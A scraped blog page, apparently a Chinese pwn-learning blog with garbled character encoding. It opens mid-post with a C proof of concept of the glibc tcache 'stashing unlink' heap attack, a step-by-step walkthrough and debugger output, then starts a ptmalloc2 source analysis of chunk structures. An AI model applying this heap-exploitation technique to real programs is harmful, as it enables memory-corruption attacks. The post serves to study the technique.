class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆé¡ºåºåˆ†é…9ä¸ªå †å—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŠŠ[3,8]è¿™å…­ä¸ªæ”¾åˆ°tcacheä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†1æ”¾åˆ°tcacheä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶tcacheä¸­çš„ç»“æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;1----&gt;8----&gt;7----&gt;6----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†0å’Œ2å…ˆåæ”¾åˆ°unsortedbinä¸Š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">	unsortedbin&lt;----&gt;2&lt;----&gt;1</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ†é…ä¸€ä¸ª0xa0å¤§å°çš„å †å—,æ˜¾ç„¶æ‰€æœ‰0x90çš„å †å—éƒ½ä¸åˆé€‚,éœ€è¦åˆ°topchunkä¸Šåˆ‡å‰²æ–°çš„,ä½†æ˜¯å¯¹è¿™ä¸ª0xa0çš„åˆ†é…è¿‡ç¨‹ä¸­,ä¼šè®©unsortedbinä¸­çš„å †å—åˆ†ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">smallbin[&quot;smallbin[idx]&quot;]&lt;----&gt;1&lt;----&gt;2</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ†é…ä¸¤ä¸ª0x90,è¿™æ¬¡å‘½ä¸­tcache</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>

<p>ç„¶åç¯¡æ”¹ä½äºsmallbinä¸­çš„2å·å †å—çš„bkæŒ‡é’ˆ,æ”¹æˆstack_varçš„åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_lis[2][1] = (unsigned long)stack_var;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">smallbin[&quot;smallbin[idx]&quot;]&lt;----&gt;1&lt;----&gt;2----&gt;stack_var</span><br></pre></td></tr></table></figure>

<p>ç„¶åcalloc(1,0x90)ä¼šç»•è¿‡lib_malloc,ç›´æ¥è°ƒç”¨int_malloc,è¿™å°±ç»•è¿‡äº†tcacheåˆ†é…,ä½¿ç”¨smallbinåˆ†é…,æŠŠ1å·å †å—ä»smallbinä¸Šå¸ä¸‹æ¥,ç„¶åå°†2å’Œä¼ªé€ çš„stack_varå‡å †å—æ”¾åˆ°tcacheä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcache[idx]&quot;]----&gt;stack_var----&gt;2----&gt;5----&gt;4----&gt;3</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å†åˆ†é…<code> target = malloc(0x90);</code>å°±æ˜¯åœ¨libc_mallocä¸­ä½¿ç”¨tcacheè¿›è¡Œåˆ†é…</p>
<p>targetæ‹¿åˆ°çš„å°±æ˜¯ä¸€ä¸ªæ ˆåœ°å€äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;stack_var</span><br><span class="line">$<span class="number">3</span> = (<span class="type">unsigned</span> <span class="type">long</span> (*)[<span class="number">16</span>]) <span class="number">0x7fffffffd2e0</span></span><br><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">4</span> = (<span class="type">unsigned</span> <span class="type">long</span> *) <span class="number">0x7fffffffd2f0</span></span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/10/26/malloc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/26/malloc/" class="post-title-link" itemprop="url">glibc2.23 Ptmalloc2 æºç åˆ†æ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-26 22:03:00 / Modified: 22:04:01" itemprop="dateCreated datePublished" datetime="2023-10-26T22:03:00+08:00">2023-10-26</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Dive-Into-Ptmalloc2"><a href="#Dive-Into-Ptmalloc2" class="headerlink" title="Dive Into Ptmalloc2"></a>Dive Into Ptmalloc2</h1><p><del>åŸºäºglibc2.23çš„ptmalloc2æºç åˆ†æ</del></p>
<h2 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>å †ç©ºé—´ç®¡ç†çš„æœ€å°å•å…ƒ</p>
<p>æ¯ä¸ªå †å—ç”±å…ƒæ•°æ®å’Œæ•°æ®ä¸¤éƒ¨åˆ†ç»„æˆ</p>
<p>å…ƒæ•°æ®è®°å½•äº†è¯¥å †å—çš„ç‰©ç†å‰å—å¤§å°,æœ¬å—å¤§å°,åˆ†é…åŒº,å‰å—ä½¿ç”¨,æ˜¯å¦<code>mmap</code>å—çŠ¶æ€,ä»¥åŠç©ºé—²çŠ¶æ€ä¸‹çš„å‰é©±åç»§æŒ‡é’ˆ</p>
<p>æ•°æ®å°±æ˜¯è¿”å›ç»™ç”¨æˆ·çš„å¯ç”¨ç©ºé—´</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h4 id="å­—æ®µæ„ä¹‰"><a href="#å­—æ®µæ„ä¹‰" class="headerlink" title="å­—æ®µæ„ä¹‰"></a>å­—æ®µæ„ä¹‰</h4><h5 id="prev-size"><a href="#prev-size" class="headerlink" title="prev_size"></a>prev_size</h5><p>å¦‚æœç‰©ç†ä¸Šç´§æŒ¨ç€çš„ä¸€ä¸ª<code>chunk</code>ç©ºé—²çš„è¯,åˆ™è¯¥å€¼ä¸ºç‰©ç†ä¸Šå‰é¢ç´§æŒ¨ç€çš„é‚£ä¸ª<code>chunk</code>çš„å¤§å°.</p>
<p>å¦‚æœç‰©ç†ä¸Šç´§æŒ¨ç€çš„ä¸€ä¸ª<code>chunk</code>å ç”¨çš„è¯,åˆ™è¯¥å€¼å¯ä»¥è¢«ç‰©ç†ä¸Šç´§æŒ¨ç€çš„é‚£ä¸ª<code>chunk</code>ä½¿ç”¨(ç©ºé—´å¤ç”¨)</p>
<h5 id="size"><a href="#size" class="headerlink" title="size"></a>size</h5><p>æœ¬chunkçš„å¤§å°,åŒ…æ‹¬chunkå¤´å’Œ<code>chunk</code>æ•°æ®</p>
<blockquote>
<p>å…¶ä¸­chunkå¤´å°±æ˜¯<code>malloc_chunk</code>ç»“æ„ä½“,chunkæ•°æ®å°±æ˜¯è¿”å›ç»™ç”¨æˆ·ä½¿ç”¨çš„å†…å­˜ç©ºé—´</p>
</blockquote>
<p>æ¯ä¸ª<code>chunk</code>çš„å¤§å°éƒ½å¿…é¡»æ˜¯<code>2*SIZE_SZ</code>æ•´æ•°å€</p>
<p>32ä½ç³»ç»Ÿä¸­size_sz&#x3D;4,64ä½ç³»ç»Ÿä¸­size_sz&#x3D;8</p>
<p>å› æ­¤32ä½ç³»ç»Ÿä¸Šchunkå¤§å°æ˜¯8çš„å€æ•°,64ä½ä¸Šchunkæ˜¯16çš„å€æ•°</p>
<p>è¯šå¦‚æ˜¯,åˆ™sizeçš„ä½3ä½æ°¸è¿œç”¨ä¸åˆ°,ä¸ºäº†èŠ‚çœç©ºé—´,ptmallocçš„å®ç°ä¸­,è¿™ä¸‰ä¸ªä½ä½è¡¨ç¤ºä¸‰ä¸ªç¬¦å·A,M,P</p>
<h5 id="fd-bk"><a href="#fd-bk" class="headerlink" title="fd,bk"></a>fd,bk</h5><p>å½“æœ¬chunkç©ºé—²å¹¶ä¸”æŒ‚åœ¨binä¸Š,æ­¤æ—¶fd,bkåˆ†åˆ«æ˜¯å‰å‘å’Œåå‘chunkçš„æŒ‡é’ˆ,ç›¸å½“äºåŒå‘é“¾è¡¨.</p>
<p>æ³¨æ„æ˜¯é€»è¾‘ä¸Šç›¸é‚»,ä¹Ÿå°±æ˜¯é“¾è¡¨ç›¸è¿,ä¸æ˜¯ç‰©ç†ä¸Šç›¸é‚»</p>
<h5 id="fd-nextsize-bk-nextsize"><a href="#fd-nextsize-bk-nextsize" class="headerlink" title="fd_nextsize,bk_nextsize"></a>fd_nextsize,bk_nextsize</h5><p>å½“chunkç©ºé—²å¹¶ä¸”æŒ‚åœ¨large binä¸­æ—¶,ç”¨äºæŸ¥æ‰¾æœ€è¿‘åŒ¹é…çš„ç©ºé—²chunk</p>
<p>æ€ä¹ˆä¸ªç”¨æ³•å‘¢?</p>
<p>large binä¸­æŒ‚ç€çš„chunkæ˜¯æŒ‰ç…§å¤§å°æ’åºçš„,ä¸€ä¸ªchunké€»è¾‘ä¸Šç›¸è¿çš„chunkå¯èƒ½å¤§å°ç›¸åŒ,ä¹Ÿå¯èƒ½ä¸åŒ,fd_nextsize,bk_nextsizeå°±æŒ‡å‘ç¬¬ä¸€ä¸ª<strong>å¤§å°ä¸åŒ</strong>çš„chunk</p>
<p>è¿™æ ·è¯´æ¯”è¾ƒæŠ½è±¡,å…·ä½“è§åé¢çš„largebinç»“æ„</p>
<h4 id="ç©ºé—´å¤ç”¨"><a href="#ç©ºé—´å¤ç”¨" class="headerlink" title="ç©ºé—´å¤ç”¨"></a>ç©ºé—´å¤ç”¨</h4><h5 id="åˆ†é…æ—¶çŠ¶æ€"><a href="#åˆ†é…æ—¶çŠ¶æ€" class="headerlink" title="åˆ†é…æ—¶çŠ¶æ€"></a>åˆ†é…æ—¶çŠ¶æ€</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<h5 id="ç©ºé—²æ—¶çŠ¶æ€"><a href="#ç©ºé—²æ—¶çŠ¶æ€" class="headerlink" title="ç©ºé—²æ—¶çŠ¶æ€"></a>ç©ºé—²æ—¶çŠ¶æ€</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">      |             Size of previous chunk                            |</span><br><span class="line">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `head:<span class="string">&#x27; |             Size of chunk, in bytes                         |P|</span></span><br><span class="line"><span class="string">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">      |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="string">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">      |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="string">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">      |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="string">      .                                                               .</span></span><br><span class="line"><span class="string">      .                                                               |</span></span><br><span class="line"><span class="string">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">    `foot:&#x27;</span> |             Size of chunk, in bytes                           |</span><br><span class="line">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<h4 id="å®å®šä¹‰"><a href="#å®å®šä¹‰" class="headerlink" title="å®å®šä¹‰"></a>å®å®šä¹‰</h4><h5 id="æŒ‡é’ˆè½¬æ¢"><a href="#æŒ‡é’ˆè½¬æ¢" class="headerlink" title="æŒ‡é’ˆè½¬æ¢"></a>æŒ‡é’ˆè½¬æ¢</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))</span></span><br></pre></td></tr></table></figure>

<p>memå°±æ˜¯æ•°æ®åŒº,chunkå°±æ˜¯malloc_chunkçš„åŸºåœ°å€,ä¸¤è€…çš„å…³ç³»åœ¨å›¾ä¸Šè¡¨ç¤º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç„¶memç½‘ä¸Šæ•°ä¸¤ä¸ªæˆå‘˜å°±æ˜¯chunk,è¿™ä¸¤ä¸ªæˆå‘˜éƒ½æ˜¯INTERNAL_SIZE_Tç±»å‹çš„,åœ¨32ä½å¹³å°ä¸Šåˆ†åˆ«é•¿4å­—èŠ‚,åœ¨64ä½å¹³å°ä¸Šåˆ†åˆ«é•¿8å­—èŠ‚</p>
